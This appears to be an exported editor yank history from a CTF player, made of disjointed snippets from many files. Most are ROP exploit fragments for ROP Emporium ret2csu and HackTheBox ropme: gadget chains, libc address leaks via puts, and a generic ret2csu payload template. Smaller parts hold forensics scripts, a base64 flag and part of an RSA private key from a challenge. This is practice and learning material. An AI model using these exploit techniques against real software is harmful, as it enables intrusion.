79eda979854e9e7c1840e67644c27c08|file:///home/neo/ropemporium/ret2csu/exploit.py|48|23|v|python
	puts
5613001ce3d04c93ef09ed4b735bed31|file:///home/neo/ropemporium/ret2csu/exploit.py|57|1|V|python
	payload += p64(PUTS_PLT)
1375106c3ae9f332b6ecd62e801cdc4a|file:///home/neo/ropemporium/ret2csu/exploit.py|47|1|V|python
	log.info("Puts plt: %#x" % PUTS_PLT)
a14ec18058f1746cf8f6ddfd7bb02035|file:///home/neo/ropemporium/ret2csu/exploit.py|52|1|V|python
	POP_RSI_R15 = 0x00000000004008a1
d41714ae1e5f14ce4d4231dc94285de5|file:///home/neo/ropemporium/ret2csu/exploit.py|60|1|V|python
	payload += p64(POP_RSI_R15)
	payload += p64(GOT)
	payload += "junkjunk"
	payload += p64(PUTS_PLT)
	payload += p64(PWNME_ADDR)
	line = io.recvline()
	log.info("Received %s" % line )
	
	
	io.sendline(payload)
	
	io.interactive()
	
3c83c6974195e22f904d3700f1a660fe|file:///home/neo/ropemporium/ret2csu/exploit.py|60|1|V|python
	payload += p64(POP_RSI_R15)
	payload += p64(GOT)
	payload += "junkjunk"
895d70186612a1aa0f7ba91e0c055f64|file:///home/neo/ropemporium/ret2csu/exploit.py|60|1|V|python
	payload += p64(PUTS_GOT)
e073b109f5984492ddcf49a6d9675275|file:///home/neo/ropemporium/ret2csu/exploit.py|52|1|V|python
	POP_RAX_JMP = 0x000000000040064d
	GOT = 0x0000000000600ff0
afa6f47595c93e3227fc3dd5c83ede40|file:///home/neo/ropemporium/ret2csu/exploit.py|52|1|V|python
	PWNME_ADDR = exe.sym.pwnme
ebfc9ab4f160bb3819b7640dc95015fb|file:///home/neo/ropemporium/ret2csu/exploit.py|60|1|V|python
	payload += p64(PWNME_ADDR)
15170ee56be24a6cfca24d025e5ce3ff|file:///home/neo/ropemporium/ret2csu/exploit.py|56|1|V|python
	payload += p64(POP_RDI)
	payload += p64(PUTS_GOT)
	payload += p64(POP_RAX_JMP)
	payload += p64(PUTS_PLT)
644400ff5b5a310b3899309b8258cb54|file:///home/neo/ropemporium/ret2csu/exploit.py|53|4|v|python
	0x000000000040089a <+90>:    
ff893b69708b685848ed647c2ec9868c|file:///home/neo/ropemporium/ret2csu/exploit.py|54|4|v|python
	0x000000000040089b <+91>:    
70fde5b5a91c75db56216696298bb02a|file:///home/neo/ropemporium/ret2csu/exploit.py|55|4|v|python
	0x000000000040089c <+92>:    
642d4b4f66b082e36ce308d6f4642c31|file:///home/neo/ropemporium/ret2csu/exploit.py|56|4|v|python
	0x000000000040089e <+94>:    
a16d38cdbf43bf1a1d9ec0cfc13d8497|file:///home/neo/ropemporium/ret2csu/exploit.py|57|4|v|python
	0x00000000004008a0 <+96>:    
ad93acd7c9f184ebbe82e1dd78d29532|file:///home/neo/ropemporium/ret2csu/exploit.py|58|4|v|python
	0x00000000004008a2 <+98>:    
f4b347be8064eed049a164c3115ce1d1|file:///home/neo/ropemporium/ret2csu/exploit.py|59|4|v|python
	0x00000000004008a4 <+100>:   
463f418d9ef6091275f1ea3095c2abc0|file:///home/neo/ropemporium/ret2csu/exploit.py|53|4|v|python
	pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
ed81f10431a03ef89298305533d2c1ad|file:///home/neo/ropemporium/ret2csu/exploit.py|53|15|v|python
	    0x0000000000400880 <+64>:    mov    rdx,r15
1e23124220032a1eb6c20ebc5acd29bf|file:///home/neo/ropemporium/ret2csu/exploit.py|54|4|v|python
	0x0000000000400880 <+64>:    
f0f1893bafcc81e1fad0c9932429a443|file:///home/neo/ropemporium/ret2csu/exploit.py|55|4|v|python
	0x0000000000400883 <+67>:    
b63f15546742b7453cb8655ce3dd73ca|file:///home/neo/ropemporium/ret2csu/exploit.py|56|4|v|python
	0x0000000000400886 <+70>:    
ef2ab7438ab75b824c90e5687baf825c|file:///home/neo/ropemporium/ret2csu/exploit.py|57|4|v|python
	0x0000000000400889 <+73>:    
e4b8821a99c4bdd6ef46346c6431ede0|file:///home/neo/ropemporium/ret2csu/exploit.py|54|1|v|python
	mov rdx,r15; mov rsi,r14; mov edi,r13d; call QWORD PTR [r12+rbx*8]
cf99e78308f672377aba6119f51dfc93|file:///home/neo/ropemporium/ret2csu/exploit.py|59|1|V|python
	# Step 1: leak libc addresses
99ccd5f6f3aa1fd20c18a1260ce6e26f|file:///home/neo/ropemporium/ret2csu/exploit.py|64|1|V|python
	payload += "junkjunk" # rbp
70c88750f10bd75cd84f6957795ac508|file:///home/neo/ropemporium/ret2csu/exploit.py|72|1|V|python
	
	line = io.recvline()
	log.info("Received %s" % line )
	
d01b77869e3ef185644ad0fa48037b3b|file:///home/neo/ropemporium/ret2csu/exploit.py|72|16|v|python
	RET_GADGET
4d0d196e04d5e319efefaebcc26bf80d|file:///home/neo/ropemporium/ret2csu/exploit.py|65|1|V|python
	payload += p64(CSU_GADGET_1)
	payload += p64(0) # rbx
	payload += "junkjunk" # rbp
	payload += p64(RET2WIN_GOT) # r12
	payload += "junkjunk" # r13
	payload += "junkjunk" # r14
	payload += p64(ARG) # r15
	
	payload += p64(RET_GADGET)
	payload += p64(CSU_GADGET_2)
9aabfb45a7befc7411e3d3505750e488|file:///home/neo/ropemporium/ret2csu/exploit.py|63|1|V|python
	# We have control of rdx through __libc_csu_init, now we just need to set the correct addresses (rbx = 0, r12 = ret2win, r15 = arg -> rdx)
a149f590b761a43b8c1e9efd59a51478|file:///home/neo/ropemporium/ret2csu/exploit.py|54|1|V|python
	RET2WIN_GOT = exe.got["ret2win"]
c0014561c2aac4a81ac126f2cb831f15|file:///home/neo/ropemporium/ret2csu/exploit.py|67|16|v|python
	RET2WIN_GOT
221c4e7d1494b70e87fa98f7ca0adc71|file:///home/neo/CTFs/tamuctf2020/calculataser/client.py|8|1|V|python
	    ws.connect("ws://challenges.tamuctf.com:3012/", header=["BC_LINE_LENGTH: 100"])
38f8daa03c92eff204588e9c04bb54c4|file:///home/neo/CTFs/tamuctf2020/calculataser/client.py|8|5|V|python
	    ws.connect("ws://challenges.tamuctf.com:3012/", header=["BC_ENV_ARGS: bcrc"])
382825934741e1917578ae341fa91569|file:///home/neo/CTFs/tamuctf2020/calculataser/client.py|10|14|v|python
	100000000 * 1000000000
03a1b30cb1af684d70f778648d803d61|file:///home/neo/CTFs/tamuctf2020/calculataser/test.bc|1|1|V|bc
	-
	define test (n) { return (2*n); }
5cd9ac3c9a8d261a4a3d40bb63911143|file:///home/neo/ropemporium/ret2csu/exploit.py|51|1|V|python
	log.info("Puts got: %#x" % PUTS_GOT)
861fd849afd6a51548e80a552c50665d|file:///home/neo/ropemporium/ret2csu/exploit.py|50|1|V|python
	START_GOT = exe.got["__libc_start_main"]
	log.info("start got: %#x" % START_GOT)
317e720d42f16e449971ee2883ac8e24|file:///home/neo/ropemporium/ret2csu/exploit.py|65|16|v|python
	GMON_START
e7999f90a48eeb2558c77a3c63ffdb0f|file:///home/neo/ropemporium/ret2csu/exploit.py|50|10|v|python
	0x00000000004006a0
2b648e6abaeacf550e559647b96033a9|file:///home/neo/ropemporium/ret2csu/exploit.py|50|1|V|python
	SYMTAB = 0x0000000000600e20
0f2b2d54e18a10bcfa92cfc18c918bb5|file:///home/neo/ropemporium/ret2csu/exploit.py|65|16|v|python
	SYMTAB
f9fcea3d2c049acaa90aa17e7771e9bc|file:///home/neo/ropemporium/ret2csu/exploit.py|50|1|V|python
	INIT = 0x400560
faee4ca3c30ee18148ce3ada37466498|file:///home/neo/ropemporium/ret2csu/exploit.py|65|16|v|python
	INIT
e4b4ce8f2e0bc62a4aa1aadecdd1964c|file:///home/neo/ropemporium/ret2csu/exploit.py|50|11|v|python
	0x0000000000600e20
fe698def6e2ca480e6233f5cc1378034|file:///home/neo/ropemporium/ret2csu/exploit.py|67|1|V|python
	payload += "junkjunk" # r14
3450a0514a4506f9b50e54d54452424c|file:///home/neo/ropemporium/ret2csu/exploit.py|70|1|V|python
	payload += p64(RET_GADGET)
2020cd4326623dba63f438dd50200fd5|file:///home/neo/CTFs/notes/pwn.md|32|1|V|markdown
	```
	import tty
	def local(argv=[], *a, **kw):
	    return process([exe.path] + argv, stdin=PTY, raw=False)
	    ...
	io.send(chr(tty.CEOF))
	```
a8d9f5a1508c8a7b1fca50233b8f5f5f|file:///home/neo/ropemporium/ret2csu/exploit.py|53|16|v|python
	0x000000000040089a
87faef40b6a1c2e86f003d61899459da|file:///home/neo/ropemporium/ret2csu/exploit.py|56|1|v|python
	   0x000000000040088d <+77>:    
46dc1f8c4046c43ec97f44ae6694857b|file:///home/neo/ropemporium/ret2csu/exploit.py|57|1|v|python
	   0x0000000000400891 <+81>:    
0fdda59e9f36f21ddab01a777f319c0d|file:///home/neo/ropemporium/ret2csu/exploit.py|58|1|v|python
	   0x0000000000400894 <+84>:    
5de1ff1e9c7b31647f69e37f56bfa742|file:///home/neo/ropemporium/ret2csu/exploit.py|58|13|v|python
	 <__libc_csu_init+64>
5010b91308a0f114981a40126b97cef0|file:///home/neo/ropemporium/ret2csu/exploit.py|56|1|v|python
	add rbx,0x1; cmp rbp,rbx; jne 0x400880
0fcc90da4811c877ba9f9c12f7d60bc9|file:///home/neo/ropemporium/ret2csu/exploit.py|64|16|v|python
	DYNAMIC
76df38b85a0d6ba9965eebe5854dfc9a|file:///home/neo/ropemporium/ret2csu/exploit.py|65|1|V|python
	payload += "junkjunk" # r13 (If we needed to set the first argument, pass it here)
9d4cedc815b39427983e022b89c21031|file:///home/neo/ropemporium/ret2csu/exploit.py|65|29|v|python
	(If we needed to set the first argument, pass it here)
8b04d5e3775d298e78455efc5ca404d5|file:///home/neo/ropemporium/ret2csu/exploit.py|66|53|v|python
	first
1eefa2c44074313f3ea51d145c845010|file:///home/neo/ropemporium/ret2csu/exploit.py|53|1|V|python
	CSU_GADGET_1 = exe.sym.__libc_csu_init + 90 # pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
	CSU_GADGET_2 = exe.sym.__libc_csu_init + 64 # mov rdx,r15; mov rsi,r14; mov edi,r13d; call QWORD PTR [r12+rbx*8]; add rbx,0x1; cmp rbp,rbx; jne 0x400880
9e1e000dabd2c9e1f445a4db6ded0bd7|file:///home/neo/ropemporium/ret2csu/exploit.py|61|1|V|python
	payload += p64(CSU_GADGET_1)
	payload += p64(0) # rbx
	payload += p64(1) # rbp (set up so cmp rbp,rbx returns zero and the jump is not taken)
	payload += p64(INIT_ARRAY_START) # r12 (find a pointer to a function that doesn't change rbx, I found init_array_start in symtab section)
	payload += "junkjunk" # r13 (If we needed to set the first argument, pass it here)
	payload += "junkjunk" # r14 (If we needed to set the second argument, pass it here)
	payload += p64(ARG) # r15 (Third argument)
df0831ced57713518633f794e01d3b3c|file:///home/neo/ropemporium/ret2csu/exploit.py|69|1|V|python
	payload += p64(CSU_GADGET_2)
8bc827fa99206f202e9802bc2a666439|file:///home/neo/CTFs/notes/pwn.md|45|1|V|markdown
	    payload = b''
	    payload += p64(pop_all)
	    payload += p64(0)             # rbx
	    payload += p64(1)             # rbp
	    payload += p64(PTR)        # r12
	    payload += arg1                # r13
	    payload += arg2                # r14
	    payload += arg3                # r15
	    payload += p64(call_any)
0fcb7a57936b9b39ac6967866c1346b7|file:///home/neo/CTFs/notes/pwn.md|39|28|v|markdown
	 (set up so cmp rbp,rbx returns zero and the jump is not taken)
e866231598ed4cb18be5e493240a11b0|file:///home/neo/CTFs/notes/pwn.md|33|20|v|markdown
	arg1
80a26383e00e892c98ebd598edcc5dbb|file:///home/neo/CTFs/notes/pwn.md|33|26|v|markdown
	arg2
9fca2538bfc4fbba5fdf0c75fb8c552c|file:///home/neo/CTFs/notes/pwn.md|41|34|v|markdown
	If we needed to set the first argument, pass it here
72c27ffc8c720c87049f57e06327b536|file:///home/neo/CTFs/notes/pwn.md|42|34|v|markdown
	If we needed to set the second argument, pass it here
074d9a3de43e9354a7f83ff992d7078a|file:///home/neo/CTFs/notes/pwn.md|40|20|v|markdown
	INIT_ARRAY_START
c112d1d282aa5acb05b3cfbb64e02491|file:///home/neo/CTFs/notes/pwn.md|34|27|V|markdown
	    pop_all = elf.symbols.__libc_csu_init + 90 # rbx_rbp_r12_r13_r14_r15
	    call_any = elf.symbols.__libc_csu_init + 64 # call(r12+rbx*8) rdi/r13 rsi/r14 rdx/r15 
8f134b982b689ecfb87ac0a03c7d774c|file:///home/neo/CTFs/skeleton.py|1|1|V|python
	#!/usr/bin/env python
806796ad2f13cf63612c15310e8dc512|file:///home/neo/hackthebox/forensics/usb-ripper/manufacturers|1|1|V|
	1336BA657773B419D3EE799258FF7
ec9a702e9da3cf05a30c15974842a7d8|file:///home/neo/hackthebox/forensics/usb-ripper/check.py|9|1|V|python
	for line in accessed:
	    print(line)
	
f6bebf8663e88ee76faed7e65b5066b3|file:///home/neo/hackthebox/forensics/usb-ripper/check.py|9|1|V|python
	def uncommon(a,b): 
	    c = [value for value in a if value not in b] 
	    return c
	d= uncommon(authenticated, accessed)
	print(d)
	
0082f18e6994e88d27cd1bc587a217f9|file:///home/neo/hackthebox/forensics/usb-ripper/check.py|9|1|V|python
	# print(accessed[0])
342d671021cebdca17bd07e7b1db8eef|file:///home/neo/hackthebox/forensics/usb-ripper/check.py|9|13|v|python
	accessed
700633a1b0f65fa8456a18bd6053193c|file:///home/neo/hackthebox/forensics/usb-ripper/check.py|10|20|v|python
	authenticated
a9c5911ab476b3bbc10cb9ff754b3582|file:///home/neo/hackthebox/forensics/usb-ripper/check.py|10|1|V|python
	for line in authenticated:
	    authshort.append(line[:10])
890fea8dd3b91b79e40e59ac21fa13c7|file:///home/neo/hackthebox/forensics/usb-ripper/check.py|17|13|v|python
	authshort
52927e954e3354f37d1f2d0d348a28ec|file:///home/neo/hackthebox/forensics/usb-ripper/check.py|18|20|v|python
	accshort
e8ba62cb6b22da8cdd064d139d475e26|file:///home/neo/hackthebox/forensics/usb-ripper/serial.json|1|5|V|json
	    "serial": [
6b3c75df8a65413ee7b6c8b82da48af5|file:///home/neo/hackthebox/forensics/usb-ripper/serial.json|100001|1|V|json
	    ]
d02f072cfcc55e95f95ab3d23578fac0|file:///home/neo/hackthebox/forensics/usb-ripper/prod.json|100001|5|V|json
	    ],
c77ac38ebdebbaa026304f558f08023f|file:///home/neo/hackthebox/forensics/usb-ripper/check.py|3|1|V|python
	authmanu = open("auth.manu", "r")
2ed814687dd0d51fae1801c8460eebac|file:///home/neo/hackthebox/forensics/usb-ripper/check.py|6|1|V|python
	manufuct = open("manufacturers", "r")
a53611eec625832c858f5c60a39ceb33|file:///home/neo/hackthebox/forensics/usb-ripper/check.py|3|1|V|python
	authmanu = open("auth.manu", "r")
	authprod = open("auth.prod", "r")
	authser = open("auth.ser", "r")
e776581bd0eeedbeb716530b6f44e3a2|file:///home/neo/hackthebox/forensics/usb-ripper/check.py|11|1|V|python
	authenticatedmanu = authmanu.readlines()
a8c15973426505fd7118eee84413c0da|file:///home/neo/hackthebox/forensics/usb-ripper/check.py|14|1|V|python
	accessed = manufuct.readlines()
eada3b1c73eb1cc66bc141c834e7fe26|file:///home/neo/hackthebox/forensics/usb-ripper/check.py|11|1|V|python
	authenticatedmanu = authmanu.readlines()
	authenticatedprod = authprod.readlines()
	authenticatedser = authser.readlines()
4c98d9d432ab3bc3f3f32febc8818aa1|file:///home/neo/hackthebox/forensics/usb-ripper/check.py|19|1|V|python
	authshort = []
	accshort = []
	for line in authenticated:
	    authshort.append(line[:10])
	
	for line in accessed:
	    accshort.append(line[:10])
9d170dc103f727b90aa83aa89effbbbe|file:///home/neo/hackthebox/forensics/usb-ripper/check.py|19|1|V|python
	for line in accmanu:
	    if line not in authmanu:
	        print("Manufact",line)
5e480953c72842553fd827896690fe17|file:///home/neo/hackthebox/forensics/usb-ripper/check.py|25|16|v|python
	Manufact
574988bd83483829de319c3488bab8cd|file:///home/neo/hackthebox/forensics/usb-ripper/check.py|24|1|V|python
	for line in accprod:
	    if line not in authprod:
	        print("Prod",line)
	
	for line in accser:
	    if line not in authser:
	        print("Serial",line)
aa4944e6ebe8575bafcf073261ea9464|file:///home/neo/hackthebox/forensics/usb-ripper/check.py|20|5|V|python
	    print(line)
5a523cc6096ae8e1c01e99ac861f0e10|file:///home/neo/hackthebox/forensics/usb-ripper/syslog|325234|1|V|
	Aug  3 07:18:01 kali kernel: [ 7364.305849] usb 1-1: new high-speed USB device number 5 using ehci-pci
	Aug  3 07:18:01 kali kernel: [ 7364.305850] usb 1-1: New USB device found, idVendor=3993, idProduct=9324
	Aug  3 07:18:01 kali kernel: [ 7364.305851] usb 1-1: New USB device strings: Mfr=1, Product=2, SerialNumber=3
	Aug  3 07:18:01 kali kernel: [ 7364.305852] usb 1-1: Product: 1F8ADAEE73D993944FC7C7783
	Aug  3 07:18:01 kali kernel: [ 7364.305853] usb 1-1: Manufacturer: 884CCC9A3DF08F49C621373E
	Aug  3 07:18:01 kali kernel: [ 7364.305854] usb 1-1: SerialNumber: 71DF5A33EFFDEA5B1882C9FBDC1240C6
	Aug  3 07:18:01 kali kernel: [ 7364.305855] usb-storage 1-1:1.0: USB Mass Storage device detected
	Aug  3 07:18:01 kali kernel: [ 7364.305856] scsi host3: usb-storage 1-1:1.0
	Aug  3 07:18:10 kali kernel: [ 7364.305857] usb 1-1: USB disconnect, device number 5
89542a6ecf1113639e028ef3d29849a2|file:///media/neo/Storage/ctf/featherduster/featherduster/bad.txt|1|1|V|text
	Aug  3 07:18:01 kali kernel: [ 7364.305849] usb 1-1: new high-speed USB device number 5 using ehci-pci
	Aug  3 07:18:01 kali kernel: [ 7364.305850] usb 1-1: New USB device found, idVendor=3993, idProduct=9324
	Aug  3 07:18:01 kali kernel: [ 7364.305851] usb 1-1: New USB device strings: Mfr=1, Product=2, SerialNumber=3
6151c8c66ee1e259a3a2040111b1f845|file:///media/neo/Storage/ctf/featherduster/featherduster/bad.txt|4|1|V|text
	Aug  3 07:18:01 kali kernel: [ 7364.305855] usb-storage 1-1:1.0: USB Mass Storage device detected
	Aug  3 07:18:01 kali kernel: [ 7364.305856] scsi host3: usb-storage 1-1:1.0
	Aug  3 07:18:10 kali kernel: [ 7364.305857] usb 1-1: USB disconnect, device number 5
7e020538536a72e92c47473ff2c9de1f|file:///home/neo/patchvm.sh|7|1|V|sh
	git clone https://github.com/mkubecek/vmware-host-modules.git
50953444baa3b4c900f6345f094438da|file:///home/neo/hackthebox/pwn/ropme/exploit.py|46|1|V|python
	0x61616173
be29785519ca5374dca6fea6d0978255|file:///home/neo/hackthebox/pwn/ropme/exploit.py|59|1|V|python
	PUTS_LIBC = u64(io.recvline(False).ljust(8, '\x00'))
f1aaa02ccfd1864b8d5f1456d0b7a7f0|file:///home/neo/hackthebox/pwn/ropme/exploit.py|52|1|V|python
	OFFSET = cyclic_find(0x61616173)
	payload = "A" * OFFSET
	payload += p64(POP_RDI)
	payload += p64(PUTS_GOT)
	payload += p64(PUTS_PLT)
	io.sendline(payload)
	PUTS_LIBC = u64(io.recvline(False).ljust(8, '\x00'))
	log.info("Puts@libc: %#x" % PUTS_LIBC)
1f5db3cf045e5515f251afd74abf14a9|file:///home/neo/hackthebox/pwn/ropme/exploit.py|54|1|V|python
	payload += p64(POP_RDI)
	payload += p64(PUTS_GOT)
	payload += p64(PUTS_PLT)
	io.sendline(payload)
	PUTS_LIBC = u64(io.recvline(False).ljust(8, '\x00'))
	log.info("Puts@libc: %#x" % PUTS_LIBC)
366c1c98416dfbb6dacfa6817b2e63df|file:///home/neo/hackthebox/pwn/ropme/exploit.py|65|1|v|python
	PUTS_L 
470afc7d558145be0cbe82a0378ec2a4|file:///home/neo/hackthebox/pwn/ropme/exploit.py|61|1|V|python
	line = io.recvline()
	log.info("Received %s" % line)
08b242667453c540c4e0d44cb1ab4d1d|file:///home/neo/hackthebox/pwn/ropme/exploit.py|59|1|V|python
	payload += p64(MAIN_ADDR)
f5108c8e833eef57a793477f00e6d903|file:///home/neo/hackthebox/pwn/ropme/exploit.py|47|1|V|python
	log.info("Puts@plt: %s" % PUTS_PLT)
013b709308532ea5c5946579a2d8649d|file:///home/neo/hackthebox/pwn/ropme/exploit.py|49|1|V|python
	log.info("Main: %s" % MAIN_ADDR)
a5754fce0d0be5be0e901738f7fd1389|file:///home/neo/hackthebox/pwn/ropme/exploit.py|51|1|V|python
	log.info("Puts@got: %s" % PUTS_GOT)
3a7c594d7b58ecd732b451c055e298d8|file:///home/neo/hackthebox/pwn/ropme/exploit.py|46|1|V|python
	POP_RDI = 0x00000000004006d3
eee2a073da4037ed4591b0a364c41462|file:///home/neo/hackthebox/pwn/ropme/exploit.py|63|1|V|python
	log.info("Received %s" % line)
e737f44a2bf83aa5edb1fe65ef5cdbd0|file:///home/neo/CTFs/notes/pwn.md|21|1|V|markdown
	    PUTS_LIBC = u64(io.recvline(False).ljust(8, '\x00'))
1ad02e45d310c9b06158b59b5b71834c|file:///home/neo/hackthebox/pwn/ropme/exploit.py|54|1|V|python
	io.recvuntil('dah?')
5195c6bf1e930ff5103224e241ab708c|file:///home/neo/hackthebox/pwn/ropme/exploit.py|62|30|V|python
	PUTS_LIBC = u64(io.recvline(False).ljust(8, '\x00'))
	log.info("Puts@libc: %#x" % PUTS_LIBC)
8f9c53e2db4515c65b0997185df9604f|file:///home/neo/hackthebox/pwn/ropme/exploit.py|54|1|V|python
	line = io.recvuntil('dah?')
00b0074f8740da8b8c335e43111074b5|file:///home/neo/hackthebox/pwn/ropme/exploit.py|62|1|V|python
	line = io.recvuntil('dah?')
	log.info("Received: %s" % line)
673dd8c2467691e4841e580d525a614e|file:///home/neo/hackthebox/pwn/ropme/exploit.py|56|1|V|python
	payload = "A" * OFFSET
	payload += p64(POP_RDI)
	payload += p64(PUTS_GOT)
	payload += p64(PUTS_PLT)
	payload += p64(MAIN_ADDR)
	io.sendline(payload)
6addd0b8467db17946f0775228cb1db7|file:///home/neo/hackthebox/pwn/ropme/exploit.py|63|1|V|python
	line = io.recvuntil('dah?')
	PUTS_LIBC = u64(line[:7].ljust(8, '\x00'))
	log.info("Puts@libc: %#x" % PUTS_LIBC)
37735c80a78d06f8ce0678f9ba8b64bb|file:///home/neo/hackthebox/pwn/ropme/exploit.py|61|17|^v|python
	io.recvline(False).
b98935a25155ee39264ca76a5fe37197|file:///home/neo/hackthebox/pwn/ropme/exploit.py|61|1|V|python
	line = io.recvline(False)
	log.info("Received: %s" % line)
7bef5aab28b6f40ec1496b2d457121d4|file:///home/neo/hackthebox/pwn/ropme/exploit.py|62|1|V|python
	line = io.recvline(False)
bc14bc0b08cf999c5e076a1651528ad7|file:///home/neo/hackthebox/pwn/ropme/exploit.py|67|1|V|python
	
	payload = "A" * OFFSET
	payload += p64(POP_RDI)
	payload += p64(FGETS_GOT)
	payload += p64(PUTS_PLT)
	io.sendline(payload)
	io.recvline()
	line = io.recvline(False)
	log.info("Received: %s" % line)
	# PUTS_LIBC = u64(line.ljust(8, '\x00'))
	# log.info("Fgets@libc: %#x" % PUTS_LIBC)
	
9d620d6ad6cb1b15b8f726fec8f7cfd4|file:///home/neo/hackthebox/pwn/ropme/exploit.py|45|1|V|python
	MAIN_ADDR = exe.sym.main
	log.info("Main: %#x", % MAIN_ADDR)
ca88d1aae09003e477001fcefc542d62|file:///home/neo/hackthebox/pwn/ropme/exploit.py|46|1|V|python
	log.info("Main: %#x", % MAIN_ADDR)
6839a24cc4a6aa35e6f5493d29df7b0c|file:///home/neo/hackthebox/pwn/ropme/exploit.py|48|1|V|python
	log.info("Puts@plt: %#x", % PUTS_PLT)
bfa27cb6809400cfd9e296f165767b81|file:///home/neo/hackthebox/pwn/ropme/exploit.py|50|1|V|python
	log.info("Puts@got: %#x", % PUTS_GOT)
2111de1edf187074f0db846323673da3|file:///home/neo/hackthebox/pwn/ropme/exploit.py|60|1|V|python
	payload = "A" * OFFSET
	payload += p64(POP_RDI)
	payload += p64(PUTS_GOT)
	payload += p64(PUTS_PLT)
	payload += p64(MAIN_ADDR)
	io.sendline(payload)
	line = io.recvline()
	line = io.recvline(False)
	log.info("Received: %s" % line)
	PUTS_LIBC = u64(line.ljust(8, '\x00'))
	log.info("Puts@libc: %#x" % PUTS_LIBC)
ac8e17f14e1bafafeda3eee0cc579d57|file:///home/neo/hackthebox/pwn/ropme/exploit.py|100|1|V|python
	LIBC_BASE
14022653317cba39fd2366eae2855acc|file:///home/neo/CTFs/notes/pwn.md|20|1|V|markdown
	- Unpack leaked address:
	    PUTS_LIBC = u64(io.recvline(False).ljust(8, '\x00'))
754ea8f4d708285fceaa7a32b31501e2|file:///home/neo/hackthebox/forensics/Illumination.JS/config.json|3|12|v|json
	SFRCe3YzcnNpMG5fYzBudHIwbF9hbV9JX3JpZ2h0P30=
c7b5e6ef108e2632e63f37e0e1cf11aa|file:///home/neo/hackthebox/forensics/secret-recipe/key64|2|1|V|
	neo@neo:~/hackthebox/forensics/secret-recipe$ cat rsa_private.key 
9e183cf5b67c3f4e2f0bd3bdf260aa26|file:///home/neo/hackthebox/forensics/secret-recipe/key64|2|1|V|
	-----BEGIN RSA PRIVATE KEY----- 
36044b7db73eb541977d06ef19322e1c|file:///home/neo/hackthebox/forensics/secret-recipe/key64|2|1|^v|
	n
	-
	b
	5
	k
	8
	W
	n
	Q
	3
	s
	C
	Z
	m
	8
	l
	+
	Z
	h
	Y
	+
	E
	O
	J
	M
	z
	r
	1
	6
	N
	9
	0
	3
	M
	e
	X
	8
	v
	+
	p
	2
	6
	X
	E
	J
	B
	7
	K
	I
	a
	q
	g
	E
	V
	2
	-
	
ba90079ad6f1b50ecb5a43d6c5e3ce38|file:///home/neo/hackthebox/forensics/secret-recipe/key64|2|1|V|
	eo@neo:~/hackthebox/forensics/secret-recipe$ cat rsa_private.key 
	----BEGIN RSA PRIVATE KEY----- 
	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 
